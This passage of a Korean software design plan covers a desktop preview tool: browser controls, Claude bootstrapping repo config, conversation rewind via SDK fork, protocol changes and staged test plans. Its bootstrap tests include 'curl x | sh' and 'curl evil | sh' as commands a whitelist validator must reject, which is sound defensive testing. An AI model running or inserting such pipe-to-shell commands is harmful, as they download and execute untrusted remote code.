key: "l", meta: true }` 를 재생해 웹이 주소창에 포커스, `확대 ⌘=` · `축소 ⌘-` · `실제 크기 ⌘0` → `view.zoom()`. `개발자 도구 ⌥⌘I` 는 `!app.isPackaged` 에서만, 도구 UI 대상 그대로(개발자 것). 메뉴 가속키는 포커스가 채팅에 있어도 뷰에 있어도 같은 곳에 닿으므로 `before-input-event` 전달 목록(`preview-view.ts:269-271`)은 늘리지 않는다. Windows 는 `autoHideMenuBar` 라 메뉴가 숨어 있어도 가속키는 산다. **ⓓ 주소창이 후보를 낸다.** `parseAddress` 가 이미 `routes` 를 받는다(`preview-address.ts:37`) — 입력에 `<datalist>` 를 달아 선언된 라우트(상태가 둘 이상이면 `?state=` 짝도)를 후보로. 네이티브 datalist 라 스타일 · 키보드가 공짜다. **ⓔ 배율.** `preview:zoom { factor }` → `webContents.setZoomFactor`, 뷰가 `cds-preview:zoom { factor }` 로 되알린다(메뉴에서 바꾸면 렌더러가 몰라서). 100% 가 아니면 프레임 머리에 `120%` 칩 — 클릭이 `실제 크기`. 에뮬레이션(D69)과는 독립: 폭은 장치, 배율은 눈이다 |

밖: 히스토리 목록(길게 누르기) · 페이지 안 검색(⌘F) · 제목 표시 — 목업 검토에는 화면
이름 병기(`frame__name--beside`)가 제목이고, 찾기는 핀이 대신한다.

```
│ ◀ ▶ ⟳  /pay/PayFailed?state=error ▾        결제 실패 · 오류   120%  │   ← ⟳ 는 로딩 중 ◌ 로 돌고, 그때 클릭 = 중단
│                                     ├ /pay/PayFailed                  │   ← datalist 후보
│                                     ├ /pay/PayFailed?state=empty      │
│                                     └ /pay/PayFailed?state=error      │
```

## 4. 결정 — 시작과 되감기

"기획자는 git 도 터미널도 열지 않는다" 는 약속의 첫 구멍은 **시작**에 있다. `cds-design.json`
이 없는 레포는 피커가 막고 "개발자에게 CDS 설정을 요청해 주세요" 라고 말한다(앞 판 D28) —
개발자가 먼저 손을 대야 기획자가 시작할 수 있다. 그 준비는 레포 안의 일이고, 레포 안의 일은
Claude 의 몫이다(D94). 두 번째 구멍은 **마음에 안 드는 답** 뒤에 있다 — 다른 채팅 도구의
`다시 생성` 이 여기서는 파일까지 되감아야 참이다(D95).

| # | 항목 | 결정 |
|---|---|---|
| D94 | 레포 연결 준비는 Claude 가 한다 | 게이트는 두 곳이다 — 피커의 `만들기` 가 GitHub `contents/cds-design.json` 로 미리 막고(`RepoPicker.tsx:207-208`, `github.ts:133-160`), 데몬은 클론 뒤 `readCdsDesignConfig` 가 없으면 던져 `error` 로 간다(`repo.ts:232-233, 1621`). 그런데 **세션은 클론만 있으면 시작된다**(`server.ts:1021` — 전제는 `existsSync(repo.root)` 뿐). 계약의 실체는 JSON 하나가 아니라 넷 — ① `cds-design.json` ② 화면을 선언하는 dev 전용 브리지(`cds-design.screens`, D68) ③ `[data-screen]` · `[data-state]` 래퍼와 `/<feature>/<Screen>?state=` 규칙 ④ `CLAUDE.md` — 이고 Claude 가 만드는 것도 넷이다(①만 있으면 미리보기는 뜨지만 선택기가 비고 핀이 안 붙는다). **흐름**: 피커 검사가 `없음` 이면 `만들기` 대신 **`Claude 가 연결 준비하기`**(`project.create { bootstrap: true }`) → 클론 → 새 `RepoPhase` `preparing`(`ProgressPanel` 문장 `Claude 가 레포를 살펴보고 연결을 준비하는 중`) → 데몬이 대화 하나를 만들어 `brief` 마커 턴(카드 제목 `연결 준비`)을 보낸다 — 본문에 계약 넷과 템플릿(참조 레포의 브리지 · `CLAUDE.md` · 래퍼 예)을 문자열로 동봉(`packages/daemon/src/bootstrap-brief.ts`, 참조 레포에서 뽑아 커밋한 상수) → Claude 가 넷을 쓴다 → 턴이 끝나면 데몬이 JSON 을 **기계 검증**: `install` 은 락파일이 정하는 것 하나(`pnpm-lock.yaml` → `pnpm install` · `package-lock.json` → `npm ci` · `yarn.lock` → `yarn install`), `check` · `build` · `preview.command` 는 `<pm> [run] <script>` 꼴이고 `<script>` ∈ `package.json#scripts`, `preview.port` 는 1–65535 — 통과하면 지금의 `install → preview` 로 이어진다(`repo.ts:1621`). 벗어나면 `error` + 지금 문장 + `자세히` 에 Claude 가 쓴 JSON(`errorKind: "bootstrap"`). 검증은 `package.json` 만 본다 — 도구가 레포 배치를 읽지 않는다는 원칙 안이다. 준비 커밋은 **첫 저장**이 실어 첫 넘기기가 `연결 준비` PR 이 된다 — 개발자가 거절할 수 있고, 거절되면 그 레포는 프로젝트가 아니다(지금의 저장 · 넘기기 게이트가 그대로 그 역할). 토큰으로 push 못 하는 레포는 피커가 지금처럼 경고하고 준비는 허용한다(화면 작업은 되고 PR 만 못 연다). 개발자 몫으로 남는 것은 환경(private registry 토큰 · 사내 인증)뿐 — 지금도 `ProgressPanel` 이 설정으로 안내한다 |
| D95 | 답을 다시 받는다 — 파일도 기억도 그 전으로 | 다른 채팅 도구의 `복사 · 다시 생성 · 메시지 편집` 중 **복사는 이미 있다**(`components.tsx:491-509`, 답변 말풍선 hover). `다시 보내기` 는 실패한 턴에만 있고(`:543-547`), 성공한 답에는 `이 답변 이전으로 되돌리기`(D52 체크포인트, `:673-682`)가 있다 — 그런데 그것은 **파일만** 되감는다: Claude 의 기억에는 그 답이 남아 다음 턴이 "아까 한 대로" 를 이어 간다. 여기서 `다시 생성` 은 파일과 대화를 **같이** 되감아야 참이다. SDK 가 그 재료를 갖고 있다: `resume` + `resumeSessionAt`(그 UUID 까지만 이어 받는 절단 재개, `forkSession` 으로 새 id) + `resumeDropsTurn`(버리는 턴의 프롬프트 UUID — 검증 실패 시 `Resume rejected by --resume-drops-turn:` 로 거절, `sdk.d.ts:1933-1989`). **UI**: 답변 말풍선 hover 에 `복사`(있음) · `이 답변 이전으로 되돌리기`(있음) · **`다시 요청`**; 기획자 말풍선 hover 에 **`고쳐서 다시 보내기`**(문장이 컴포저에 들어와 편집 뒤 전송). 둘의 뜻은 하나다 — k 번째 답을 버리고 다시 받는다: ① 체크포인트 k 복원(D52 — 트리 전체 스냅샷이라 k 이후 답들이 바꾼 파일도 함께 돌아간다) ② 대화를 k−1 번째 답의 마지막 체인 항목까지로 절단해 새 세션으로 fork(k = 1 이면 fork 없이 새 대화) ③ 같은(또는 고친) 문장을 보낸다. 트리에는 **대화 하나만** 남는다 — 새 id 가 같은 제목을 이어받고(`settings.sessionTitles`), 옛 대화록은 fork 가 **성공한 뒤** D76 경로로 지운다(기획자가 그 답을 버렸고 파일은 이미 돌아갔다). k 가 마지막 답이 아니면 `ConfirmDialog`(0단계) — `이 답 이후의 답 N개도 함께 사라집니다`. 데몬: 새 메시지 `session.rewind { sessionId, turn, text, images? }` → `{ sessionId }`; 절단점 UUID 는 데몬이 SDK 대화록에서 읽는다(`session.history` 가 이미 그 파일을 읽는다 — 선로에 UUID 를 싣지 않는다). 거절(`Resume rejected…`)이면 되감기 없이 **파일만 복원하고 새 턴으로 보내며** 카드에 `Claude 의 기억은 그대로입니다` 한 줄 — SDK 문서대로 재시도하지 않는다. **분기는 이 판 밖**(§8): SDK `forkSession` 은 준비돼 있지만 클론이 하나라 두 갈래가 같은 파일을 밟는다 |

```
피커: 검사 → ✗ cds-design.json 없음
      [ Claude 가 연결 준비하기 ]            ← 지금은 여기서 막힌다
           ↓
클론 → preparing ─ Claude 가 레포를 살펴보고 연결을 준비하는 중 ─ 카드 `연결 준비`
           ↓  Claude: cds-design.json · 브리지 · 래퍼 · CLAUDE.md
데몬 검증(package.json#scripts 화이트리스트 · 락파일 · 포트) → install → preview ready
           ↓
첫 저장 → 첫 넘기기 = `연결 준비` PR                ← 개발자의 수용 게이트는 그대로
```

## 5. 선로 · 브리지 변경

프로토콜 추가는 다섯 — 선택 필드(`element` · `shot` · `reviews` · `project.create.bootstrap`), 열거 값
(`RepoPhase` `preparing` · `errorKind` `bootstrap`), 새 클라이언트 메시지 둘(`comments.reply` D88 ·
`session.rewind` D95), 새 서버 이벤트 하나(`preview.opened`, D91) — 전부 v10 클라이언트를 깨지 않는
추가다. 범프는 앞 판 D33 과 같은 규칙으로 **마지막 선로 변경이 들어가는 2단계 끝에 한 번, v11**.
데스크톱 브리지(IPC) 변경은 선로가 아니다.

| 자리 | 변경 |
|---|---|
| `comments.record`(zod) | `items[].element?: { component: string; path: string; rect: { x, y, width, height } }`(D78) |
| `CommentItem` | `element?: …` 같은 모양. `comments.ts#isCommentItem` 은 `element` 가 없거나 모양이 맞을 때만 행을 살린다 |
| 오버레이 봉투 | `cds-design.comments.resolve { id, resolved }`(D78) — zod 타입을 `protocol` 에, 뷰의 `onOverlayPost` 가 `cds-preview:comment-resolve` 로 건넨다 |
| 데스크톱 브리지(`preload.ts` · `desktop-bridge.d.ts`) | `preview.pins(items: CommentItem[])` → `preview:pins` → `view.pins(items)` → `cds-overlay:pins`; `did-navigate` 때 마지막 목록을 다시 보낸다(`preview-view.ts:236` 옆). 구독 `preview.onCommentResolve(cb)` |
| 데스크톱 브리지 — 브라우저(D85) | `preview.stop()` → `preview:stop` → `webContents.stop()`; `preview.zoom(factor)` → `preview:zoom` → `setZoomFactor`; 구독 `preview.onZoom(cb)`(`cds-preview:zoom`). `preview.onLoading` 은 이미 있다 — 웹이 구독만 한다. 메뉴 → 렌더러는 기존 `cds-preview:key` 채널을 재생(⌘L) |
| 앱 메뉴(D85) | 신규 `packages/desktop/src/menu.ts` — `buildMenuTemplate({ preview, packaged })` 순수 함수 + `main.ts` 에서 `Menu.setApplicationMenu` 한 번. 기본 메뉴의 `reload · zoom* · toggleDevTools(패키징)` 역할은 사라진다 |
| 오버레이 봉투(D87) | `cds-design.comments.items[].shot?: { mediaType, data }` — **뷰가** 채운다, preload 는 모른다. preload 명령 `cds-overlay:capture { on }` |
| `session.send`(D87) | 변경 없음 — `images` 가 이미 있다 |
| `repo.handoffStatus`(D88) | 응답에 `reviews?: …` 선택 필드. `HandoffStatus` 는 그대로 |
| 턴 마커(D88) | 종류 `review` — `turn-marker.ts` 한 파일 |
| 웹 상태(D86) | 선로 변경 없음 — `queued` 는 `useSessions` 의 셈 |
| 마커 `error`(D89) | `route · state · errorKind` 그대로에 `kind: "look"` 값 하나 추가(`ErrorMarkerKind`) — 카드 제목이 갈린다. 캡처는 마커가 아니라 `session.send` 의 `images` 로 |
| 데스크톱 브리지(D89) | `preview.snapshot()` → `preview:snapshot` → `{ jpeg, console: string[] }`; 뷰가 콘솔 링 버퍼(20줄)를 쥔다 |
| `comments.reply`(D88) | 신규 클라이언트 메시지 `{ id, body }` → `{ ok }`; GitHub 두 엔드포인트(인라인 답글 · 이슈 코멘트) |
| `diff.status`(D90) | 변경 없음 — `stage: "failed"` · `gate` 가 이미 있다. `pr` 은 `onSessionTurn` 을 부르지 않는 것이 변경 |
| 세션 이벤트(D91) | 신규 `{ kind: "preview.opened"; route: string; state: string \| null }` — 서버 → 클라이언트, `foldEvent` 는 블록 없음. 데몬 `createPreviewTools({ onOpened })` |
| 설정(D92) | `settings.coach` · `settings.followClaude`(D91) — localStorage, 선로 아님 |
| PR 본문(D93) | 선로 아님 — 데몬이 `updatePullRequest` 본문에 절을 더한다 |
| `project.create`(D94) | `bootstrap?: boolean` 선택 필드 |
| `RepoPhase`(D94) | 값 `preparing` 추가; `RepoStatus.errorKind` 에 `"bootstrap"` 추가 |
| `session.rewind`(D95) | 신규 클라이언트 메시지 `{ sessionId, turn, text, images? }` → `{ sessionId }`(fork 된 새 id). 절단점 UUID 는 데몬 안에서 대화록으로 푼다 — 선로에 UUID 없음 |
| `stage.ts` → `delivery.ts` | `deriveDelivery` · 단어 상수(`WORKING_LABEL · HANDOFF_BADGE · MERGED_BADGE · changesBadge`)는 이름 그대로 이사 |
| 브라우저 개발 경로 | D70(개발자 전용 iframe 미리보기에는 코멘트 UI 를 두지 않는다) 유지 — iframe 에는 핀이 없다. 칩 · 동작 셋은 `ScreenPanel` 의 것이라 두 경로 공통 |

## 6. 단계

각 단계는 `pnpm typecheck` 가 통과하는 지점에서 끝나고 그 단계의 스위트만 돌린다. 1 · 1b · 2
는 파일이 겹치는 곳이 있지만 구역이 다르다 — `ScreenPanel.tsx`(1 은 `forwardComments` · 핀 효과 ·
`CommentPinsSummary`, 2 는 상단 바 · 개발자 코멘트 패널), `PreviewHost.tsx` · `NativeHost.tsx` · `preload.ts` ·
`desktop-bridge.d.ts`(1 은 핀 · 캡처 채널, 1b 는 프레임 머리), `Composer.tsx` · `PageWorkspace.tsx` ·
`components.tsx`(1 은 대기 줄 · images · 코멘트 카드 썸네일, 2 는 placeholder · `onNewSession` ·
`review` 카드). 셋을 동시에 가되 커밋은 단계별로 나눈다. 0 은 셋보다 먼저 — 결함 ③ 의
`ConfirmDialog` 를 2 의 상단 바가 쓴다.

### 0. 준비 (1일)

- [ ] `ui-proposal.html` 을 v3 로: `.stepper` 제거, 상단 바에 상태 칩 + 동작 셋, 무대 위 기록 핀 · 초안 핀 · 말풍선, 프레임 머리의 로딩 · 배율 칩 · `이 화면 Claude 에게 보여 주기`, 컴포저 위 `다음 턴에 보냅니다 · 1건 대기` 줄, 개발자 코멘트 패널, 코멘트 카드의 썸네일, 말풍선 hover 의 `다시 요청` · `고쳐서 다시 보내기`. 앞 판처럼 채택 시 변수 이름이 `styles.css` 와 같아야 한다
- [ ] 앞 판 번호를 부르는 주석 확인: `PLAN D44 · D45 · D57 · D58 · D67` 은 이 판이 뜻을 바꾼다 — 코드가 남는 자리(`comments.ts`, `CommentsPopover.tsx`, `preview-preload.ts`, `Sidebar.tsx`)의 주석은 새 번호(D78–D82)로 고쳐 부른다. README §번호 대응표에 `D44 · D45 → D81 · D82 로 대체`, `D57 · D58 · D67 → D78 · D79 · D80 이 확장` 두 행
- [ ] **결함 셋**(스크린샷에서 관찰, 코드로 확인 — 작아서 여기서 끝낸다): ① 기획자가 `중지` 를 누르면 SDK 의 abort 예외가 영어 `notice error` + `error` 상태로 떨어진다(`session.ts:288-293`; `interrupt()`(`:542`) 가 표식을 안 남긴다) → `interrupt()` 가 `interrupting` 을 세우고 `consume` 의 catch 가 그동안의 abort 를 `turn.end { subtype: "interrupted" }` 로 바꾼다(카드 문장은 이미 있다, `components.tsx:508`). ② `.turnfail__actions` 규칙이 `styles.css` 에 없어 `다시 보내기` 가 `자세히` 를 가린다(`components.tsx:533`) → `display:flex; gap:10px; align-items:center`. ③ `window.confirm` 이 **셋**이다(`ScreenPanel.tsx:672` 변경 버리기 · `useSessions.ts:287` 대화 삭제 · `SettingsDialog.tsx:608` 접속 주소 지우기) — 앱의 다른 대화상자와 어휘 · 테마 · D65 cover 규칙 모두 밖 → `ConfirmDialog.tsx` 하나(프로젝트 지우기 대화상자의 클래스, `usePreviewCover`)로 셋을 갈고, 변경 버리기는 버릴 파일 목록을 보인다. 테스트: `ui-publish-e2e` — 중지 뒤 빨간 띠 없음 · 카드 제목 `멈추었습니다`; `ui-settings-e2e` · `ui-sidebar-e2e` — `window.confirm` 스텁이 불리지 않는다

### 1. 핀 — D78 · D79 · D80 · D86 · D87 · D89 · D91 (5~6일)

- 파일: `packages/desktop/src/preview-preload.ts`(루트 상시 마운트 · `⌥+클릭` · Alt 호버 · 기록 핀 렌더와 앵커 풀기 · 말풍선 · 편집기 버튼 셋 · 해결 봉투), `preview-view.ts`(`pins()` · 새로 고침 재전송 · `onOverlayPost` 분기), `preload.ts` · `packages/web/src/desktop-bridge.d.ts`(브리지 둘), `NativeHost.tsx`(구독), `ScreenPanel.tsx`(`recordComments` 에 `element` · `commentItems` → `bridge.pins` · 턴 종료 삭제 효과 제거 · 해결 구독 → `resolveComment`), `CommentsPopover.tsx`(`해결된 것 보기` 토글), `PreviewHost.tsx`(토글 툴팁 문장), `packages/protocol/src/index.ts`(스키마 셋), `packages/daemon/src/comments.ts`(`element` 통과 · 옛 행 허용)
- 테스트: `packages/daemon/test/comments.test.mjs`(있으면 행 추가, 없으면 신규) — `element` 가 그대로 돌아오고, `element` 없는 옛 행은 살고, 모양이 깨진 `element` 행은 버려진다; `desktop-comments.mjs` — ⓐ 모드 **꺼진** 채 `⌥+클릭` 이 초안 핀을 만들고 페이지의 클릭 핸들러는 불리지 않는다 ⓑ 편집기 `⏎ 보내기` 가 항목 하나 봉투를 올린다 ⓒ 턴이 끝나도(스텁 `sleep 2` 뒤) 핀이 남아 있다 ⓓ 새로 고침 뒤 같은 요소에 핀이 다시 선다 ⓔ 핀 말풍선 `해결` → `comments.list` 에서 `resolved: true`, 핀이 사라진다 ⓕ 화면 이동 뒤 그 화면의 핀만 보인다
- D86 · D87 파일: `useSessions.ts`(`queued` 셈 · `sendTurn(text, images?)`), `PageWorkspace.tsx`(`forwardComments` 에 images), `Composer.tsx`(대기 줄 · `⌥Enter`), `ScreenPanel.tsx`(봉투의 `shot` → images; `CommentPinsSummary`(`:714`) 는 기록 핀이 대신하므로 **삭제**), `components.tsx`(코멘트 카드 썸네일), `preview-view.ts`(`onOverlayPost` 의 comments 분기에서 캡처 세 박자), `preview-preload.ts`(`cds-overlay:capture`), `protocol`(봉투 `shot?`), README(§테스트 `test:comments-ui` 줄의 "핀 지워짐" → "핀 남음", 코멘트 핀 항목에 캡처 · 대기 줄 한 문장씩)
- D86 · D87 테스트: `desktop-comments.mjs` — ⓖ 봉투가 웹에 닿을 때 항목마다 `shot` 이 있고 JPEG 매직 바이트 · 긴 변 ≤ 600, 캡처 중 오버레이 루트가 `hidden` 이었다가 돌아온다 ⓗ 핀 7개 봉투는 `shot` 6장 ⓘ 턴이 도는 동안(`sleep 2`) 핀을 보내면 컴포저 위 `1건 대기` 가 뜨고 턴이 끝나면 사라진다 ⓙ 모바일 폭에서도 ⓖ 가 같은 요소를 찍는다
- D89 파일: `preview-view.ts`(콘솔 링 버퍼 · `snapshot()`), `preload.ts` · `desktop-bridge.d.ts`(`snapshot`), `PreviewHost.tsx`(프레임 머리 버튼 · 한 줄 입력 · 두 번째 요청 셈), `ScreenPanel.tsx`(`errorToTurn` 에 `look` + images), `turn-marker.ts` · `components.tsx`(`look` 카드 제목), `preview-preload.ts`(래퍼 없는 `⌥+클릭` 토스트)
- D89 테스트: `desktop-comments.mjs` — ⓚ `[data-screen]` 이 없는 fixture 라우트에서 `⌥+클릭` → 토스트 문장, 핀 0 ⓛ `화면 보여 주기` → 마커 `error { kind: "look" }` 턴 + images 1 + 스텁이 받은 본문에 콘솔 줄이 있다 ⓜ 같은 라우트에서 두 번째 → 카드에 `두 번째 요청`
- D91 파일: 데몬 `preview-tools.ts`(`onOpened`), `session.ts`(이벤트 발신), `protocol`(`ChatEvent` 종류), `daemon-client.ts`(`foldEvent` 분기 · `lastOpened`), `useSessions.ts`(턴 중 기획자 이동 감지 · `turn.end` 처리), `ScreenPanel.tsx`(`setTarget` · 토스트 · PiP 라벨을 `lastOpened` 로), `settings.ts` · `SettingsDialog.tsx`(`followClaude`)
- D91 테스트: `daemon-client` 단위(`foldEvent` 가 `preview.opened` 에 블록을 만들지 않는다); `preview-tools.test.mjs` — `screen_open` 이 `onOpened` 를 라우트 · 상태로 부른다; `ui-publish-e2e.mjs`(스텁 턴이 `preview.opened` 를 흘리게) — 턴 끝에 미리보기 `target` 이 그 화면 · 상태로 바뀐다, 턴 중 기획자가 선택기를 움직였으면 바뀌지 않고 토스트, 설정을 끄면 둘 다 없음; PiP 라벨이 `lastOpened` 의 제목이다
- 수용: 미리보기를 새로 열어도 어제 보낸 코멘트가 화면 위 같은 자리에 있다. 인터랙션 목업의 버튼이 모드 밖에서 그대로 눌린다. `desktop-comments.png` 에 기록 핀 · 초안 핀 두 모양이 다 보인다

### 1b. 브라우저 손질 — D85 (반나절)

- 파일: 신규 `packages/desktop/src/menu.ts`(템플릿 빌더), `main.ts`(`Menu.setApplicationMenu(buildMenu({ preview: plannerPreview, packaged: app.isPackaged }))` 한 줄 + 메인 창 `webContents.setWindowOpenHandler` — 미리보기 origin 은 `shell.openExternal`, 나머지 `deny`), `preview-view.ts`(`stop()` · `zoom()` · `cds-preview:zoom` 되알림), `preload.ts` · `desktop-bridge.d.ts`(`stop` · `zoom` · `onZoom`), `NativeHost.tsx`(`onLoading` · `onZoom` 구독 → 상태 올림), `PreviewHost.tsx`(새로 고침 버튼의 로딩 · 중단 · 새 창 경로 · `<datalist>` · 배율 칩 · ⌘L 재생 시 주소창 포커스), `styles.css`(`.frame__navbtn--busy` · `.frame__zoom`), README(내장 브라우저 항목에 로딩 · 배율 · 단축키 한 문장)
- 테스트: `packages/desktop/test/desktop.test.mjs` — `buildMenuTemplate` 순수: 보기 메뉴에 `role: "reload"` · `zoomIn` 이 없고 우리 항목의 `accelerator` 가 표와 같다, `packaged: true` 면 개발자 도구 항목이 없다; `desktop-comments.mjs`(표식은 1단계 ⓐ–ⓜ 에 이어 붙인다) — ⓝ 뷰에 포커스를 두고 ⌘R → 뷰의 `did-navigate` 가 한 번 더 오고 **도구 UI 의 `window` 전역(테스트가 심은 표식)은 살아 있다** ⓞ 주소 입력의 `list` 가 선언된 라우트 수만큼 `<option>` 을 갖는다 ⓟ `zoom(1.2)` 뒤 `webContents.getZoomFactor()` 가 1.2 이고 프레임 머리에 `120%` 칩, 폭을 모바일로 바꾸면 100% ⓠ 새 창 버튼이 여는 url 이 현재 경로를 담는다(`shell.openExternal` 을 스텁해 인자 확인) ⓡ 느린 응답 fixture 로 로딩 중 버튼이 `aria-busy` 이고 그때 클릭이 `stop` 을 부른다
- 수용: 미리보기에서 ⌘R 을 눌러도 채팅 · 팝오버 · 컴포저 초안이 그대로다. 컴파일 중 새로 고침 버튼이 돈다. 새 창이 보던 화면 · 상태로 열린다. 주소창에 `pay` 만 쳐도 후보가 뜬다

### 2. 칩 · 동작 — D81 · D82 · D83 · D84 · D88 · D90 · D92 · D93 (4~5일)

- 파일: `stage.ts` → `delivery.ts`(`deriveDelivery`; 단어 상수 이사), **삭제** `StageBar.tsx`, `ScreenPanel.tsx`(상단 바 재구성 · `deriveStage` 호출 제거 · `더 보기 ▾` 에서 저장 · 넘기기 제거 · 스테퍼 마운트 제거), `styles.css`(`.stepper*` 삭제 · `.screenpanel__actions` · 1280/1100 규칙), `Sidebar.tsx`(import 경로), `PageWorkspace.tsx`(`onNewSession` prop 제거), `Composer.tsx`(빈 대화 placeholder), 데몬 `repo.ts#ensureCycleBranch`(D84 한 줄), README(§지금 담긴 것 첫 항목 · 코멘트 핀 항목 · §패키지 `web` 행의 "스테퍼" · §번호 대응표)
- 순서: **D84 가 2단계의 첫 커밋**이다 — 상태표(D81 · D82)는 `merged` 뒤 `handoff` 가 비는 것을 전제하므로, 표를 먼저 그리면 `publish-e2e` 의 두 번째 사이클 행이 거짓 통과한다
- 테스트: `stage.test.mts` → `delivery.test.mts` — 표의 6행 + 경계(running 이면 저장 잠김과 이유 · `unsaved` 가 PR 보다 앞섬 · `merged` 에서 변경이 생기면 저장 열림 · `phase !== ready` 면 null); `publish-e2e.mjs` — 병합 뒤 **두 번째 사이클**: 파일을 고치고 저장 → `repo.status.branch` 가 새 이름이고 `handoff === null`, 넘기기 → fixture 가 `createPullRequest` 를 받는다(`updatePullRequest` 아님) → 새 PR 번호(D84); `ui-publish-e2e.mjs` — `viaActionBar` 가 `.screenpanel__bar` 의 동작 셋을 누르고, "저장할 것이 없다" 는 **잠긴 버튼의 title** 로 증명한다(`viaMoreMenu` 의 저장 경로 삭제); `ui-sidebar-e2e.mjs` — 표식 단어가 그대로인지(파일 이사 회귀)
- D88 파일: 데몬 `github.ts`(`listReviewComments` · `replyToReviewComment` · `commentOnIssue`) · `repo.ts#refreshHandoff`(`reviews` 합치기) · `server.ts`(`comments.reply`), `protocol`(`handoffStatus` 응답 · `comments.reply` · `ReviewMarker`), `turn-marker.ts`, `ScreenPanel.tsx`(배지 · 패널 · `고치기` · `답하기` · `모두 Claude 에게`), `components.tsx`(`review` 카드), `settings.ts`(`handledReviews` · `replyConfirmed`)
- D88 테스트: `publish-e2e.mjs` — fixture 에 `pulls/{n}/comments` 2건 녹음 → `handoffStatus.reviews.length === 2`, 본문 · path · line 그대로; `comments.reply` → fixture 가 `POST …/replies` 를 받고 본문이 같다; `turn-marker.test.mts` — `review` 종류 왕복; `ui-publish-e2e.mjs` — `상태 확인 · 개발자 코멘트 2` 배지 → 패널 → `고치기` → 카드 제목 `개발자 코멘트에 답하기`, 카드 첫 줄에 파일 경로 없음, 배지 `1` → `답하기` 첫 회 확인 대화상자 → 배지 `0`; 화면 어디에도 `리뷰` 가 없다
- D90 파일: 데몬 `repo.ts`(`failGate` 의 `pr` 분기 · `push` 사유 분기), `ScreenPanel.tsx`(`gateRetry` 상태 · `turn.end` 에 한 번 재호출 · `중지` 시 해제), `components.tsx`(게이트 카드의 `다시 저장하는 중…` · `두 번 실패했습니다` 줄), `HandoffPanel.tsx`(`pr` 실패 안내 + `설정 열기`)
- D90 테스트: `publish-e2e.mjs` — `pr` 실패 fixture(403) → `diff.status.gate === "pr"` 이고 **세션 턴이 없다**; `push` 403 → 턴 없음, `push` non-fast-forward → 턴 있음; `ui-publish-e2e.mjs` — check 실패 → 카드 → 스텁 턴 끝 → 저장이 **자동으로 한 번** 다시 돌아 `저장됨`; 두 번 연속 실패 fixture → 카드 `두 번 실패했습니다`, 세 번째 호출 없음
- D92 파일: 신규 `CoachMark.tsx`(한 문장 + `알겠어요`, 앵커 요소 옆), `ShortcutsSheet.tsx`(`⌘/`), `shortcuts.ts`(단축키 상수 — `menu.ts` 가 같은 상수를 import 하도록 `packages/protocol` 에 두거나 데스크톱이 웹의 상수를 읽지 못하니 **protocol** 에), `settings.ts`(`coach`), `SettingsDialog.tsx`(`안내 다시 보기`), `PageWorkspace.tsx`(`⌘/`), `ScreenPanel.tsx` · `PreviewHost.tsx`(앵커)
- D92 테스트: `ui-publish-e2e.mjs` — 첫 진입에 코치 마크 ① 이 보이고 `알겠어요` 뒤 새로 고침해도 다시 안 뜬다, `상태 확인` 이 처음 생길 때 ③; `⌘/` → 시트에 `⌥+클릭` · `⌘R` 행; `desktop.test.mjs` — 메뉴 템플릿의 가속키 집합 ⊆ `shortcuts.ts` 상수(두 벌 일치)
- D93 파일: 데몬 `repo.ts#runHandoff`(`readComments` → `### 수정 요청` 절 · 이후 저장 시 본문 갱신), `handoff-draft.ts`(주석 — 데몬이 붙이는 절과 겹치지 않게)
- D93 테스트: `publish-e2e.mjs` — 코멘트 3건(해결 1) 기록 뒤 넘기기 → fixture 가 받은 본문에 `### 수정 요청` · `[x]` 1 · `[ ]` 2 · 화면 **제목**이 있고 CSS 경로 · 컴포넌트명이 없다; 두 번째 저장 뒤 `updatePullRequest` 본문에 새 항목
- 선로 마감: 1 · 1b · 2 · 2b 가 전부 들어온 뒤 `PROTOCOL_VERSION = 11`(§5) — 이 한 줄이 2단계의 마지막 커밋이다
- 수용: 어느 시점에도 `저장` 과 `개발자에게 넘기기` 가 상단 바에 있고, 잠겼으면 마우스를 올려 이유를 읽을 수 있다. `grep -rn "stepper\|deriveStage\|StageBar" packages/*/src packages/*/test` 가 0건. 1280 스크린샷에서 상단 바가 한 줄

### 2b. 연결 준비 — D94 (1.5~2일)

- 파일: `RepoPicker.tsx`(막힘 → `Claude 가 연결 준비하기`, `bootstrap` 플래그), `protocol`(`project.create.bootstrap?` · `RepoPhase` `preparing` · `errorKind` `bootstrap`), 데몬 `projects.ts` · `server.ts`(`project.create` 가 플래그를 워크스페이스로), `repo.ts`(`sync` 의 설정 없음 분기 → `preparing` · 턴 종료 대기 · `validateBootstrapConfig` 순수 함수 · 통과 시 지금 경로), 신규 `bootstrap-brief.ts`(브리프 본문 + 템플릿 상수 — 참조 레포의 브리지 · `CLAUDE.md` · 래퍼 예), `session-manager.ts`(데몬이 여는 대화 — 코멘트 봉투가 대화를 여는 것과 같은 길, `PageWorkspace.tsx:236`), `ScreenPanel.tsx`(`ProgressPanel` 에 `preparing` 문장 · `bootstrap` 안내), `components.tsx`(`brief` 카드 제목 `연결 준비`)
- README: §연결 레포 만들기 첫 문장 "계약은 파일 하나다" 뒤에 "없으면 Claude 가 만든다 — 개발자는 첫 PR 로 받는다" 한 문단, §빠른 시작의 레포 고르기 문장, §번호 대응표 D28 행에 "D94 가 선택지로 바꿈"
- 테스트: `repo.test.mjs` — `validateBootstrapConfig` 순수: 락파일 셋 → install 셋, `scripts` 에 없는 명령 거부, `pnpm run dev` · `pnpm dev` · `npm run dev` 허용, `curl x | sh` 거부, 포트 범위; `onboarding-e2e.mjs`(진짜 소켓) — `cds-design.json` 없는 fixture 레포 + 스텁 Claude(브리프를 받으면 유효한 JSON 과 브리지 파일을 쓰고 끝난다) → `phase` 가 `preparing` → `ready`, `pendingChanges > 0`(준비 커밋이 저장을 기다린다); 스텁이 `preview.command: "curl evil | sh"` 를 쓰면 `error` · `errorKind: "bootstrap"`; `ui-onboarding-e2e.mjs` — 검사 `없음` 에서 버튼 문장이 `Claude 가 연결 준비하기` 이고 누르면 진행 화면 문장, 끝나면 작업 공간
- 수용: `cds-design.json` 이 없는 레포를 골라도 기획자가 개발자를 부르지 않고 미리보기까지 간다. 화이트리스트 밖 명령은 한 번도 실행되지 않는다(스텁 케이스에서 프로세스 목록에 없다)

### 2c. 되감기 — D95 (1.5~2일, 스파이크 반나절 포함)

- 스파이크 먼저(반나절, 실 Claude `test:daemon` 한 케이스): 도구를 쓴 턴(파일 편집 · `cds-preview` MCP) 뒤 `resume` + `resumeSessionAt`(직전 답의 마지막 체인 UUID) + `resumeDropsTurn` + `forkSession` 이 새 id 로 이어지고, 다음 턴이 버린 답을 모른다는 것을 확인한다. 거절되는 케이스(대기 중 메시지가 끼어든 턴)도 한 번 만들어 폴백 문장을 본다. 안 되면 D95 는 "파일 복원 + 재전송" 으로 줄이고 카드에 `기억은 그대로` 를 항상 단다
